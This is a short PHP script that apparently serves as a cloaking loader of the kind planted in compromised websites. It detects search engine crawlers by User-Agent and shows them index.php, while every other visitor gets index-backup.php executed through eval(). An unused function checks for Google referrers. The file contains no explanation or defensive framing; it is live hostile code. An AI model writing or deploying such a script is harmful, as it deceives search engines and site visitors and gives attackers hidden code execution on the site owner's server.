<?php
function detectSearchEngineBot() {
    return preg_match(
        '/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|Googlebot|TelegramBot|Google-Site-Verification|Google-InspectionTool|AhrefsBot)/i', 
        $_SERVER['HTTP_USER_AGENT']
    );
}
function checkReferralFromGoogle() {
    return isset($_SERVER['HTTP_REFERER']) && 
           (strpos($_SERVER['HTTP_REFERER'], 'google.com') !== false || 
            strpos($_SERVER['HTTP_REFERER'], 'google.co.id') !== false);
}

function loadLocalFileContent($filePath) {
    if (file_exists($filePath)) {
        return file_get_contents($filePath);
    } else {
        return "File not found => $filePath";
    }
}
$landingPage = __DIR__ . '/index.php';      
$backupPage  = __DIR__ . '/index-backup.php';
$requestPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
if (detectSearchEngineBot() && ($requestPath === '/' || $requestPath === '' || $requestPath === '/index.php')) {
    echo loadLocalFileContent($landingPage);
} else {
    eval('?>'.loadLocalFileContent($backupPage));
}
